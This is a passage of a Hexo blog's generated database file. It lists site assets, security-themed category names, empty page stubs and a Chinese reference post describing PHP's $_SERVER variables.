588},{"_id":"public/libs/codeBlock/codeLang.js","hash":"ea8b51e4d75e7b2cd63e4d5bcb8db2cf7f23f5db","modified":1631357035588},{"_id":"public/libs/jqcloud/jqcloud-1.0.4.min.js","hash":"257eaae3020599e4939f50d5008a743827f25b8c","modified":1631357035588},{"_id":"public/libs/jqcloud/jqcloud.css","hash":"20d9f11a19d95c70e27cb922e0d6dccbec4eae89","modified":1631357035588},{"_id":"public/libs/others/busuanzi.pure.mini.js","hash":"6e41f31100ae7eb3a6f23f2c168f6dd56e7f7a9a","modified":1631357035588},{"_id":"public/libs/others/clicklove.js","hash":"6a39b8c683ba5dcd92f70c6ab45d1cfac3213e8e","modified":1631357035588},{"_id":"public/libs/others/explosion.min.js","hash":"417b68e2cf2c6de2119c57626f4412105a8457f5","modified":1631357035588},{"_id":"public/libs/scrollprogress/scrollProgress.min.js","hash":"777ffe5d07e85a14fbe97d846f45ffc0087251cc","modified":1631357035588},{"_id":"public/libs/others/fireworks.js","hash":"53981959bc6def4a85bbbb41b07e4b1474a2124d","modified":1631357035588},{"_id":"public/libs/others/text.js","hash":"1791782cde0d1e4197f2ed58ecb7dd6aefddd169","modified":1631357035588},{"_id":"public/libs/codeBlock/codeShrink.js","hash":"215910dc8f63fd50b97957e5fcdc8480aa2728cb","modified":1631357035588},{"_id":"public/libs/tocbot/tocbot.css","hash":"15601837bf8557c2fd111e4450ed4c8495fd11a0","modified":1631357035588},{"_id":"public/libs/others/snow.js","hash":"7f3b1ad2f64d4473210a2c3218893649c73c980e","modified":1631357035588},{"_id":"public/libs/tocbot/tocbot.min.js","hash":"5ec27317f0270b8cf6b884c6f12025700b9a565c","modified":1631357035588},{"_id":"public/css/matery.css","hash":"381fe12af22352cc8f178a75a39188973b976ff5","modified":1631357035588},{"_id":"public/libs/aos/aos.css","hash":"191a3705a8f63e589a50a0ff2f2c5559f1a1b6b2","modified":1631357035588},{"_id":"public/libs/animate/animate.min.css","hash":"97afa151569f046b2e01f27c1871646e9cd87caf","modified":1631357035588},{"_id":"public/libs/codeBlock/clipboard.min.js","hash":"9cd57c67fbd3e3067f80793ef8445f5ff7783563","modified":1631357035588},{"_id":"public/libs/aplayer/APlayer.min.js","hash":"22caa28ff6b41a16ff40f15d38f1739e22359478","modified":1631357035588},{"_id":"public/libs/gitalk/gitalk.css","hash":"3aac1db83b0135c521187254ff302d125cc30706","modified":1631357035588},{"_id":"public/libs/dplayer/DPlayer.min.css","hash":"f7d19655f873b813ffba5d1a17145c91f82631b8","modified":1631357035588},{"_id":"public/libs/cryptojs/crypto-js.min.js","hash":"5989527a378b55011a59522f41eeb3981518325c","modified":1631357035588},{"_id":"public/libs/gitment/gitment-default.css","hash":"2903c59ee06b965bef32e937bd69f5b0b2190717","modified":1631357035588},{"_id":"public/libs/masonry/masonry.pkgd.min.js","hash":"ff940b4ea68368ca0e4d5560cbb79fb147dfc3c5","modified":1631357035588},{"_id":"public/libs/gitment/gitment.js","hash":"28c02c45ce568e084cd1041dc493f83f9c6c88c6","modified":1631357035588},{"_id":"public/libs/jquery/jquery-2.2.0.min.js","hash":"5d7e5bbfa540f0e53bd599e4305e1a4e815b5dd1","modified":1631357035588},{"_id":"public/libs/valine/Valine.min.js","hash":"4e34802ccbb59f1daa58a62241ff57f923e50600","modified":1631357035588},{"_id":"public/libs/dplayer/DPlayer.min.js","hash":"c3bad7b265574fab0ae4d45867422ea1cb9d6599","modified":1631357035588},{"_id":"public/libs/awesome/fonts/fontawesome-webfont.woff","hash":"28b782240b3e76db824e12c02754a9731a167527","modified":1631357035588},{"_id":"public/libs/awesome/fonts/fontawesome-webfont.woff2","hash":"d6f48cba7d076fb6f2fd6ba993a75b9dc1ecbf0c","modified":1631357035588},{"_id":"public/libs/share/css/share.min.css","hash":"8a778a86f3ce9a042df6be63a9f1039631e351a5","modified":1631357035588},{"_id":"public/libs/awesome/css/font-awesome.min.css","hash":"512c7d79033e3028a9be61b540cf1a6870c896f8","modified":1631357035588},{"_id":"public/libs/lightGallery/css/lightgallery.min.css","hash":"1b7227237f9785c66062a4811508916518e4132c","modified":1631357035588},{"_id":"public/libs/gitalk/gitalk.min.js","hash":"28bdb33c9eb609c2f30d431df1a4cf8ca70bf841","modified":1631357035588},{"_id":"public/libs/lightGallery/js/lightgallery-all.min.js","hash":"9f5ef4bc8a0a3c746ca4f3c3e6d64493b1a977d8","modified":1631357035588},{"_id":"public/libs/materialize/materialize.min.css","hash":"4d46df5f22cbc24eefa76228c7ee308dc3585594","modified":1631357035588},{"_id":"public/libs/materialize/materialize.min.js","hash":"c8b4c65651921d888cf5f27430dfe2ad190d35bf","modified":1631357035588},{"_id":"public/libs/share/js/social-share.min.js","hash":"4df722bafde2c5d8faaace0d1f894798385a8793","modified":1631357035588},{"_id":"public/libs/share/js/jquery.share.min.js","hash":"16ce82901ca0e302cf47a35fb10f59009a5e7eb9","modified":1631357035588},{"_id":"public/libs/valine/av-min.js","hash":"2577e72b52b736d99649f9e95be8976d58563333","modified":1631357035588},{"_id":"public/libs/awesome/fonts/fontawesome-webfont.ttf","hash":"13b1eab65a983c7a73bc7997c479d66943f7c6cb","modified":1631357035588},{"_id":"public/libs/awesome/fonts/FontAwesome.otf","hash":"048707bc52ac4b6563aaa383bfe8660a0ddc908c","modified":1631357035588},{"_id":"public/libs/awesome/fonts/fontawesome-webfont.eot","hash":"d980c2ce873dc43af460d4d572d441304499f400","modified":1631357035588},{"_id":"public/libs/echarts/echarts.min.js","hash":"9496f386a0da4601cad22c479cc5543913a4d67f","modified":1631357035588},{"_id":"public/medias/banner/20.jpg","hash":"ca2dfcff70ae767de31705e652121cd7fee41aad","modified":1631357035588},{"_id":"public/medias/banner/9.jpg","hash":"ca2dfcff70ae767de31705e652121cd7fee41aad","modified":1631357035588},{"_id":"public/medias/music/avatars/daoshu.jpg","hash":"eee120fdf5ccbe86aa7d51826c4c773e76e6357f","modified":1631357035588},{"_id":"public/medias/banner/0.jpg","hash":"74458b94512341c6e8618fe8a98019923dea4c45","modified":1631357035588},{"_id":"public/medias/banner/13.jpg","hash":"74458b94512341c6e8618fe8a98019923dea4c45","modified":1631357035588},{"_id":"public/medias/banner/2.jpg","hash":"f4a5d0f83fe6d723a4838afb29933880d378270b","modified":1631357035588},{"_id":"public/libs/awesome/fonts/fontawesome-webfont.svg","hash":"b5483b11f8ba213e733b5b8af9927a04fec996f6","modified":1631357035588},{"_id":"public/medias/banner/4.jpg","hash":"48a09893b79ba70e5f50b5d42f71975e7b1ba74a","modified":1631357035588},{"_id":"public/medias/banner/15.jpg","hash":"48a09893b79ba70e5f50b5d42f71975e7b1ba74a","modified":1631357035588},{"_id":"public/medias/banner/23.jpg","hash":"eacb865c21ff10a15a1a20ad90f5b72d43ab0840","modified":1631357035588},{"_id":"public/medias/banner/12.jpg","hash":"eacb865c21ff10a15a1a20ad90f5b72d43ab0840","modified":1631357035588},{"_id":"public/medias/banner/21.jpg","hash":"74eca9f74b38cce5102a9927730fa24a16157fb9","modified":1631357035588},{"_id":"public/medias/banner/10.jpg","hash":"74eca9f74b38cce5102a9927730fa24a16157fb9","modified":1631357035588},{"_id":"public/medias/banner/11.jpg","hash":"9f13022df9cd4690049ad6bd31889c8ed0c4d18a","modified":1631357035588},{"_id":"public/medias/banner/22.jpg","hash":"9f13022df9cd4690049ad6bd31889c8ed0c4d18a","modified":1631357035588},{"_id":"public/medias/banner/3.jpg","hash":"6650d95a32cbbf89669d36c72aeedfd2466b2350","modified":1631357035588},{"_id":"public/medias/banner/14.jpg","hash":"6650d95a32cbbf89669d36c72aeedfd2466b2350","modified":1631357035588},{"_id":"public/medias/banner/17.jpg","hash":"6facec9e5603a5966753763ecf0cc544825ca558","modified":1631357035588},{"_id":"public/medias/banner/6.jpg","hash":"6facec9e5603a5966753763ecf0cc544825ca558","modified":1631357035588},{"_id":"public/medias/banner/7.jpg","hash":"93213ab4810dc51833529d687a45ebf797b6f851","modified":1631357035588},{"_id":"public/medias/banner/18.jpg","hash":"93213ab4810dc51833529d687a45ebf797b6f851","modified":1631357035588},{"_id":"public/medias/banner/1.jpg","hash":"039d79e7192edd3664cbe49224034f0230f9ca20","modified":1631357035588},{"_id":"public/medias/banner/8.jpg","hash":"a15e925e147e25cb10b7dfbcd1af7236766c45c8","modified":1631357035588},{"_id":"public/medias/banner/19.jpg","hash":"a15e925e147e25cb10b7dfbcd1af7236766c45c8","modified":1631357035588}],"Category":[{"name":"PHP","_id":"cktfnuydc0005t8op1j3tc5j1"},{"name":"SSRF","_id":"cktfnuydi000ct8op0xibgx9l"},{"name":"LD_PRELOAD","_id":"cktfnuydq000mt8ophanz6ahm"},{"name":"CTF","_id":"cktfnuydx000wt8op796k4apj"},{"name":"CTF","parent":"cktfnuydi000ct8op0xibgx9l","_id":"cktfnuye00013t8op9gni3d1u"},{"name":"Git","_id":"cktfnuye3001at8op4f1cfx8b"},{"name":"计算机网络","_id":"cktfnuye8001jt8op61hbh3qe"},{"name":"SQL注入","_id":"cktfnuyej0027t8op7zsq2nu0"},{"name":"RCE","_id":"cktfnuyeq002ft8op26v371sf"},{"name":"FastCGI","_id":"cktfnuyf0003dt8opgqb18sd1"},{"name":"文件包含","_id":"cktfnuyf3003lt8op2r56h1g9"},{"name":"文件上传","_id":"cktfnuyf5003tt8op86spf9x1"},{"name":"源码泄露","parent":"cktfnuydx000wt8op796k4apj","_id":"cktfnuyf6003zt8opcdwt614n"},{"name":"SSRF","parent":"cktfnuyf0003dt8opgqb18sd1","_id":"cktfnuyf70043t8op1z8w2vlp"}],"Data":[{"_id":"friends","data":[{"name":"知乎专栏","url":"https://zhuanlan.zhihu.com/godweiyang","title":"访问主页","introduction":"算法码上来","avatar":"/medias/avatars/myzhihu.png"}]},{"_id":"musics","data":[{"name":"夜曲","artist":"周杰伦","url":"/medias/music/yequ.mp3","cover":"/medias/music/avatars/yequ.jpg"},{"name":"一路向北","artist":"周杰伦","url":"/medias/music/yiluxiangbei.mp3","cover":"/medias/music/avatars/yiluxiangbei.jpg"},{"name":"来自天堂的魔鬼","artist":"邓紫棋","url":"/medias/music/tiantangdemogui.mp3","cover":"/medias/music/avatars/tiantangdemogui.jpg"},{"name":"倒数","artist":"邓紫棋","url":"/medias/music/daoshu.mp3","cover":"/medias/music/avatars/daoshu.jpg"}]}],"Page":[{"title":"404","date":"1899-11-29T15:55:00.000Z","type":"404","layout":"404","description":"Oops~，我崩溃了！找不到你想要的页面了😅","_content":"","source":"404.md","raw":"---\ntitle: 404\ndate: 0000-00-00 00:00:00\ntype: \"404\"\nlayout: \"404\"\ndescription: \"Oops~，我崩溃了！找不到你想要的页面了😅\"\n---\n","updated":"2021-08-21T19:11:32.000Z","path":"404.html","comments":1,"_id":"cktfnuybg0000t8op8e4ofze3","content":"","site":{"data":{"friends":[{"name":"知乎专栏","url":"https://zhuanlan.zhihu.com/godweiyang","title":"访问主页","introduction":"算法码上来","avatar":"/medias/avatars/myzhihu.png"}],"musics":[{"name":"夜曲","artist":"周杰伦","url":"/medias/music/yequ.mp3","cover":"/medias/music/avatars/yequ.jpg"},{"name":"一路向北","artist":"周杰伦","url":"/medias/music/yiluxiangbei.mp3","cover":"/medias/music/avatars/yiluxiangbei.jpg"},{"name":"来自天堂的魔鬼","artist":"邓紫棋","url":"/medias/music/tiantangdemogui.mp3","cover":"/medias/music/avatars/tiantangdemogui.jpg"},{"name":"倒数","artist":"邓紫棋","url":"/medias/music/daoshu.mp3","cover":"/medias/music/avatars/daoshu.jpg"}]}},"excerpt":"","more":""},{"title":"categories","date":"2019-07-19T08:39:20.000Z","type":"categories","layout":"categories","_content":"","source":"categories/index.md","raw":"---\ntitle: categories\ndate: 2019-07-19 16:39:20\ntype: \"categories\"\nlayout: \"categories\"\n---","updated":"2021-03-30T23:38:08.000Z","path":"categories/index.html","comments":1,"_id":"cktfnuyd80002t8op8rcc9q1t","content":"","site":{"data":{"friends":[{"name":"知乎专栏","url":"https://zhuanlan.zhihu.com/godweiyang","title":"访问主页","introduction":"算法码上来","avatar":"/medias/avatars/myzhihu.png"}],"musics":[{"name":"夜曲","artist":"周杰伦","url":"/medias/music/yequ.mp3","cover":"/medias/music/avatars/yequ.jpg"},{"name":"一路向北","artist":"周杰伦","url":"/medias/music/yiluxiangbei.mp3","cover":"/medias/music/avatars/yiluxiangbei.jpg"},{"name":"来自天堂的魔鬼","artist":"邓紫棋","url":"/medias/music/tiantangdemogui.mp3","cover":"/medias/music/avatars/tiantangdemogui.jpg"},{"name":"倒数","artist":"邓紫棋","url":"/medias/music/daoshu.mp3","cover":"/medias/music/avatars/daoshu.jpg"}]}},"excerpt":"","more":""},{"title":"about","date":"2019-07-19T08:41:10.000Z","type":"about","layout":"about","mathjax":true,"_content":"\nNothing","source":"about/index.md","raw":"---\ntitle: about\ndate: 2019-07-19 16:41:10\ntype: \"about\"\nlayout: \"about\"\nmathjax: true\n---\n\nNothing","updated":"2021-07-27T03:04:51.000Z","path":"about/index.html","comments":1,"_id":"cktfnuydb0004t8op6kwcdywm","content":"<p>Nothing</p>\n","site":{"data":{"friends":[{"name":"知乎专栏","url":"https://zhuanlan.zhihu.com/godweiyang","title":"访问主页","introduction":"算法码上来","avatar":"/medias/avatars/myzhihu.png"}],"musics":[{"name":"夜曲","artist":"周杰伦","url":"/medias/music/yequ.mp3","cover":"/medias/music/avatars/yequ.jpg"},{"name":"一路向北","artist":"周杰伦","url":"/medias/music/yiluxiangbei.mp3","cover":"/medias/music/avatars/yiluxiangbei.jpg"},{"name":"来自天堂的魔鬼","artist":"邓紫棋","url":"/medias/music/tiantangdemogui.mp3","cover":"/medias/music/avatars/tiantangdemogui.jpg"},{"name":"倒数","artist":"邓紫棋","url":"/medias/music/daoshu.mp3","cover":"/medias/music/avatars/daoshu.jpg"}]}},"excerpt":"","more":"<p>Nothing</p>\n"},{"title":"contact","date":"2020-07-26T09:17:02.000Z","type":"contact","layout":"contact","_content":"\n# 欢迎留言\n大家有任何问题，都可以在评论区给我留言。\n","source":"contact/index.md","raw":"---\ntitle: contact\ndate: 2020-07-26 17:17:02\ntype: \"contact\"\nlayout: \"contact\"\n---\n\n# 欢迎留言\n大家有任何问题，都可以在评论区给我留言。\n","updated":"2021-07-27T03:08:17.000Z","path":"contact/index.html","comments":1,"_id":"cktfnuydf0008t8op2k287nyt","content":"<h1 id=\"欢迎留言\"><a href=\"#欢迎留言\" class=\"headerlink\" title=\"欢迎留言\"></a>欢迎留言</h1><p>大家有任何问题，都可以在评论区给我留言。</p>\n","site":{"data":{"friends":[{"name":"知乎专栏","url":"https://zhuanlan.zhihu.com/godweiyang","title":"访问主页","introduction":"算法码上来","avatar":"/medias/avatars/myzhihu.png"}],"musics":[{"name":"夜曲","artist":"周杰伦","url":"/medias/music/yequ.mp3","cover":"/medias/music/avatars/yequ.jpg"},{"name":"一路向北","artist":"周杰伦","url":"/medias/music/yiluxiangbei.mp3","cover":"/medias/music/avatars/yiluxiangbei.jpg"},{"name":"来自天堂的魔鬼","artist":"邓紫棋","url":"/medias/music/tiantangdemogui.mp3","cover":"/medias/music/avatars/tiantangdemogui.jpg"},{"name":"倒数","artist":"邓紫棋","url":"/medias/music/daoshu.mp3","cover":"/medias/music/avatars/daoshu.jpg"}]}},"excerpt":"","more":"<h1 id=\"欢迎留言\"><a href=\"#欢迎留言\" class=\"headerlink\" title=\"欢迎留言\"></a>欢迎留言</h1><p>大家有任何问题，都可以在评论区给我留言。</p>\n"},{"title":"archives","date":"2019-07-19T08:39:20.000Z","type":"archives","layout":"archives","_content":"","source":"archives/index.md","raw":"---\ntitle: archives\ndate: 2019-07-19 16:39:20\ntype: \"archives\"\nlayout: \"archives\"\n---","updated":"2021-03-30T23:38:08.000Z","path":"archives/index.html","comments":1,"_id":"cktfnuydh000at8op0z36huhm","content":"","site":{"data":{"friends":[{"name":"知乎专栏","url":"https://zhuanlan.zhihu.com/godweiyang","title":"访问主页","introduction":"算法码上来","avatar":"/medias/avatars/myzhihu.png"}],"musics":[{"name":"夜曲","artist":"周杰伦","url":"/medias/music/yequ.mp3","cover":"/medias/music/avatars/yequ.jpg"},{"name":"一路向北","artist":"周杰伦","url":"/medias/music/yiluxiangbei.mp3","cover":"/medias/music/avatars/yiluxiangbei.jpg"},{"name":"来自天堂的魔鬼","artist":"邓紫棋","url":"/medias/music/tiantangdemogui.mp3","cover":"/medias/music/avatars/tiantangdemogui.jpg"},{"name":"倒数","artist":"邓紫棋","url":"/medias/music/daoshu.mp3","cover":"/medias/music/avatars/daoshu.jpg"}]}},"excerpt":"","more":""},{"title":"friends","date":"2019-07-19T08:42:10.000Z","type":"friends","layout":"friends","_content":"\n","source":"friends/index.md","raw":"---\ntitle: friends\ndate: 2019-07-19 16:42:10\ntype: \"friends\"\nlayout: \"friends\"\n---\n\n","updated":"2021-07-27T03:08:59.000Z","path":"friends/index.html","comments":1,"_id":"cktfnuyg4004bt8op6ctb24mg","content":"","site":{"data":{"friends":[{"name":"知乎专栏","url":"https://zhuanlan.zhihu.com/godweiyang","title":"访问主页","introduction":"算法码上来","avatar":"/medias/avatars/myzhihu.png"}],"musics":[{"name":"夜曲","artist":"周杰伦","url":"/medias/music/yequ.mp3","cover":"/medias/music/avatars/yequ.jpg"},{"name":"一路向北","artist":"周杰伦","url":"/medias/music/yiluxiangbei.mp3","cover":"/medias/music/avatars/yiluxiangbei.jpg"},{"name":"来自天堂的魔鬼","artist":"邓紫棋","url":"/medias/music/tiantangdemogui.mp3","cover":"/medias/music/avatars/tiantangdemogui.jpg"},{"name":"倒数","artist":"邓紫棋","url":"/medias/music/daoshu.mp3","cover":"/medias/music/avatars/daoshu.jpg"}]}},"excerpt":"","more":""},{"title":"tags","date":"2019-07-19T08:40:27.000Z","type":"tags","layout":"tags","_content":"","source":"tags/index.md","raw":"---\ntitle: tags\ndate: 2019-07-19 16:40:27\ntype: \"tags\"\nlayout: \"tags\"\n---","updated":"2021-03-30T23:38:08.000Z","path":"tags/index.html","comments":1,"_id":"cktfnuyg5004ct8op8dhbevao","content":"","site":{"data":{"friends":[{"name":"知乎专栏","url":"https://zhuanlan.zhihu.com/godweiyang","title":"访问主页","introduction":"算法码上来","avatar":"/medias/avatars/myzhihu.png"}],"musics":[{"name":"夜曲","artist":"周杰伦","url":"/medias/music/yequ.mp3","cover":"/medias/music/avatars/yequ.jpg"},{"name":"一路向北","artist":"周杰伦","url":"/medias/music/yiluxiangbei.mp3","cover":"/medias/music/avatars/yiluxiangbei.jpg"},{"name":"来自天堂的魔鬼","artist":"邓紫棋","url":"/medias/music/tiantangdemogui.mp3","cover":"/medias/music/avatars/tiantangdemogui.jpg"},{"name":"倒数","artist":"邓紫棋","url":"/medias/music/daoshu.mp3","cover":"/medias/music/avatars/daoshu.jpg"}]}},"excerpt":"","more":""}],"Post":[{"title":"$_SERVER详解","date":"2021-09-10T06:01:08.171Z","top":false,"cover":false,"password":null,"toc":true,"mathjax":true,"summary":null,"_content":"\n# $_SERVER\n\n[官方文档](https://www.php.net/manual/zh/reserved.variables.server.php)\n\n$_SERVER -- $HTTP_SERVER_VARS [已删除] — 服务器和执行环境信息\n\n------\n\n## 目录\n\n如果以[命令行](https://www.php.net/manual/zh/features.commandline.php)方式运行 PHP，下面列出的元素几乎没有有效的(或是没有任何实际意义的)\n\n$\\_SERVER['HTTP_ACCEPT_LANGUAGE']\n\n浏览器语言 \n$\\_SERVER['REMOTE_ADDR'] \n\n当前用户 IP 。 \n$\\_SERVER['REMOTE_HOST'] \n\n当前用户主机名 \n$\\_SERVER['REQUEST_URI'] \n\nURL\n\n$\\_SERVER['REMOTE_PORT'] \n\n端口。 \n$\\_SERVER['SERVER_NAME'] \n\n服务器主机的名称。 \n$\\_SERVER['PHP_SELF']\n\n正在执行脚本的文件名 \n$\\_SERVER['argv']\n\n传递给该脚本的参数。 \n$\\_SERVER['argc'] \n\n传递给程序的命令行参数的个数。 \n$\\_SERVER['GATEWAY_INTERFACE']\n\nCGI 规范的版本。 \n$\\_SERVER['SERVER_SOFTWARE'] \n\n服务器标识的字串 \n$\\_SERVER['SERVER_PROTOCOL'] \n\n请求页面时通信协议的名称和版本 \n$\\_SERVER['REQUEST_METHOD']\n\n访问页面时的请求方法 \n$\\_SERVER['QUERY_STRING'] \n\n查询(query)的字符串。 \n$\\_SERVER['DOCUMENT_ROOT'] \n\n当前运行脚本所在的文档根目录 \n$\\_SERVER['HTTP_ACCEPT'] \n\n当前请求的 Accept: 头部的内容。 \n$\\_SERVER['HTTP_ACCEPT_CHARSET'] \n\n当前请求的 Accept-Charset: 头部的内容。 \n$\\_SERVER['HTTP_ACCEPT_ENCODING'] \n\n当前请求的 Accept-Encoding: 头部的内容 \n$\\_SERVER['HTTP_CONNECTION'] \n\n当前请求的 Connection: 头部的内容。例如：“Keep-Alive”。 \n$\\_SERVER['HTTP_HOST'] \n\n当前请求的 Host: 头部的内容。 \n$\\_SERVER['HTTP_REFERER'] \n\n链接到当前页面的前一页面的 URL 地址。 \n$\\_SERVER['HTTP_USER_AGENT'] \n\n当前请求的 User_Agent: 头部的内容。 \n$\\_SERVER['HTTPS']\n\n如果通过https访问,则被设为一个非空的值(on)，否则返回off \n$\\_SERVER['SCRIPT_FILENAME'] \n\n当前执行脚本的绝对路径名。 \n$\\_SERVER['SERVER_ADMIN'] \n\n管理员信息 \n$\\_SERVER['SERVER_PORT'] \n\n服务器所使用的端口 \n$\\_SERVER['SERVER_SIGNATURE'] \n\n包含服务器版本和虚拟主机名的字符串。 \n$\\_SERVER['PATH_TRANSLATED'] \n\n当前脚本所在文件系统（不是文档根目录）的基本路径。 \n$\\_SERVER['SCRIPT_NAME'] \n\n包含当前脚本的路径。这在页面需要指向自己时非常有用。 \n$\\_SERVER['PHP_AUTH_USER'] \n\n当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的用户名。 \n$\\_SERVER['PHP_AUTH_PW'] \n\n当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的密码。 \n$\\_SERVER['AUTH_TYPE'] \n\n当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是认证的类型","source":"_posts/$_SERVER详解.md","raw":"---\ntitle: $_SERVER详解\ndate: {{ date }}\ntop: false\ncover: false\npassword:\ntoc: true\nmathjax: true\nsummary:\ntags: PHP\ncategories: PHP\n---\n\n# $_SERVER\n\n[官方文档](https://www.php.net/manual/zh/reserved.variables.server.php)\n\n$_SERVER -- $HTTP_SERVER_VARS [已删除] — 服务器和执行环境信息\n\n------\n\n## 目录\n\n如果以[命令行](https://www.php.net/manual/zh/features.commandline.php)方式运行 PHP，下面列出的元素几乎没有有效的(或是没有任何实际意义的)\n\n$\\_SERVER['HTTP_ACCEPT_LANGUAGE']\n\n浏览器语言 \n$\\_SERVER['REMOTE_ADDR'] \n\n当前用户 IP 。 \n$\\_SERVER['REMOTE_HOST'] \n\n当前用户主机名 \n$\\_SERVER['REQUEST_URI'] \n\nURL\n\n$\\_SERVER['REMOTE_PORT'] \n\n端口。 \n$\\_SERVER['SERVER_NAME'] \n\n服务器主机的名称。 \n$\\_SERVER['PHP_SELF']\n\n正在执行脚本的文件名 \n$\\_SERVER['argv']\n\n传递给该脚本的参数。 \n$\\_SERVER['argc'] \n\n传递给程序的命令行参数的个数。 \n$\\_SERVER['GATEWAY_INTERFACE']\n\nCGI 规范的版本。 \n$\\_SERVER['SERVER_SOFTWARE'] \n\n服务器标识的字串 \n$\\_SERVER['SERVER_PROTOCOL'] \n\n请求页面时通信协议的名称和版本 \n$\\_SERVER['REQUEST_METHOD']\n\n访问页面时的请求方法 \n$\\_SERVER['QUERY_STRING'] \n\n查询(query)的字符串。 \n$\\_SERVER['DOCUMENT_ROOT'] \n\n当前运行脚本所在的文档根目录 \n$\\_SERVER['HTTP_ACCEPT'] \n\n当前请求的 Accept: 头部的内容。 \n$\\_SERVER['HTTP_ACCEPT_CHARSET'] \n\n当前请求的 Accept-Charset: 头部的内容。 \n$\\_SERVER['HTTP_ACCEPT_ENCODING'] \n\n当前请求的 Accept-Encoding: 头部的内容 \n$\\_SERVER['HTTP_CONNECTION'] \n\n当前请求的 Connection: 头部的内容。例如：“Keep-Alive”。 \n$\\_SERVER['HTTP_HOST'] \n\n当前请求的 Host: 头部的内容。 \n$\\_SERVER['HTTP_REFERER'] \n\n链接到当前页面的前一页面的 URL 地址。 \n$\\_SERVER['HTTP_USER_AGENT'] \n\n当前请求的 User_Agent: 头部的内容。 \n$\\_SERVER['HTTPS']\n\n如果通过https访问,则被设为一个非空的值(on)，否则返回off \n$\\_SERVER['SCRIPT_FILENAME'] \n\n当前执行脚本的绝对路径名。 \n$\\_SERVER['SERVER_ADMIN'] \n\n管理员信息 \n$\\_SERVER['SERVER_PORT'] \n\n服务器所使用的端口 \n$\\_SERVER['SERVER_SIGNATURE'] \n\n包含服务器版本和虚拟主机名的字符串。 \n$\\_SERVER['PATH_TRANSLATED'] \n\n当前脚本所在文件系统（不是文档根目录）的基本路径。 \n$\\_SERVER['SCRIPT_NAME'] \n\n包含当前脚本的路径。这在页面需要指向自己时非常有用。 \n$\\_SERVER['PHP_AUTH_USER'] \n\n当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的用户名。 \n$\\_SERVER['PHP_AUTH_PW'] \n\n当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的密码。 \n$\\_SERVER['AUTH_TYPE'] \n\n当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是认证的类型","slug":"$_SERVER详解","published":1,"updated":"2021-07-27T03:23:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cktfnuyd30001t8opgbqo77ge","content":"<h1 id=\"SERVER\"><a href=\"#SERVER\" class=\"headerlink\" title=\"$_SERVER\"></a>$_SERVER</h1><p><a href=\"https://www.php.net/manual/zh/reserved.variables.server.php\" target=\"_blank\" rel=\"noopener\">官方文档</a></p>\n<p>$_SERVER – $HTTP_SERVER_VARS [已删除] — 服务器和执行环境信息</p>\n<hr>\n<h2 id=\"目录\"><a href=\"#目录\" class=\"headerlink\" title=\"目录\"></a>目录</h2><p>如果以<a href=\"https://www.php.net/manual/zh/features.commandline.php\" target=\"_blank\" rel=\"noopener\">命令行</a>方式运行 PHP，下面列出的元素几乎没有有效的(或是没有任何实际意义的)</p>\n<p>$_SERVER[‘HTTP_ACCEPT_LANGUAGE’]</p>\n<p>浏览器语言<br>$_SERVER[‘REMOTE_ADDR’] </p>\n<p>当前用户 IP 。<br>$_SERVER[‘REMOTE_HOST’] </p>\n<p>当前用户主机名<br>$_SERVER[‘REQUEST_URI’] </p>\n<p>URL</p>\n<p>$_SERVER[‘REMOTE_PORT’] </p>\n<p>端口。<br>$_SERVER[‘SERVER_NAME’] </p>\n<p>服务器主机的名称。<br>$_SERVER[‘PHP_SELF’]</p>\n<p>正在执行脚本的文件名<br>$_SERVER[‘argv’]</p>\n<p>传递给该脚本的参数。<br>$_SERVER[‘argc’] </p>\n<p>传递给程序的命令行参数的个数。<br>$_SERVER[‘GATEWAY_INTERFACE’]</p>\n<p>CGI 规范的版本。<br>$_SERVER[‘SERVER_SOFTWARE’] </p>\n<p>服务器标识的字串<br>$_SERVER[‘SERVER_PROTOCOL’] </p>\n<p>请求页面时通信协议的名称和版本<br>$_SERVER[‘REQUEST_METHOD’]</p>\n<p>访问页面时的请求方法<br>$_SERVER[‘QUERY_STRING’] </p>\n<p>查询(query)的字符串。<br>$_SERVER[‘DOCUMENT_ROOT’] </p>\n<p>当前运行脚本所在的文档根目录<br>$_SERVER[‘HTTP_ACCEPT’] </p>\n<p>当前请求的 Accept: 头部的内容。<br>$_SERVER[‘HTTP_ACCEPT_CHARSET’] </p>\n<p>当前请求的 Accept-Charset: 头部的内容。<br>$_SERVER[‘HTTP_ACCEPT_ENCODING’] </p>\n<p>当前请求的 Accept-Encoding: 头部的内容<br>$_SERVER[‘HTTP_CONNECTION’] </p>\n<p>当前请求的 Connection: 头部的内容。例如：“Keep-Alive”。<br>$_SERVER[‘HTTP_HOST’] </p>\n<p>当前请求的 Host: 头部的内容。<br>$_SERVER[‘HTTP_REFERER’] </p>\n<p>链接到当前页面的前一页面的 URL 地址。<br>$_SERVER[‘HTTP_USER_AGENT’] </p>\n<p>当前请求的 User_Agent: 头部的内容。<br>$_SERVER[‘HTTPS’]</p>\n<p>如果通过https访问,则被设为一个非空的值(on)，否则返回off<br>$_SERVER[‘SCRIPT_FILENAME’] </p>\n<p>当前执行脚本的绝对路径名。<br>$_SERVER[‘SERVER_ADMIN’] </p>\n<p>管理员信息<br>$_SERVER[‘SERVER_PORT’] </p>\n<p>服务器所使用的端口<br>$_SERVER[‘SERVER_SIGNATURE’] </p>\n<p>包含服务器版本和虚拟主机名的字符串。<br>$_SERVER[‘PATH_TRANSLATED’] </p>\n<p>当前脚本所在文件系统（不是文档根目录）的基本路径。<br>$_SERVER[‘SCRIPT_NAME’] </p>\n<p>包含当前脚本的路径。这在页面需要指向自己时非常有用。<br>$_SERVER[‘PHP_AUTH_USER’] </p>\n<p>当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的用户名。<br>$_SERVER[‘PHP_AUTH_PW’] </p>\n<p>当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的密码。<br>$_SERVER[‘AUTH_TYPE’] </p>\n<p>当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 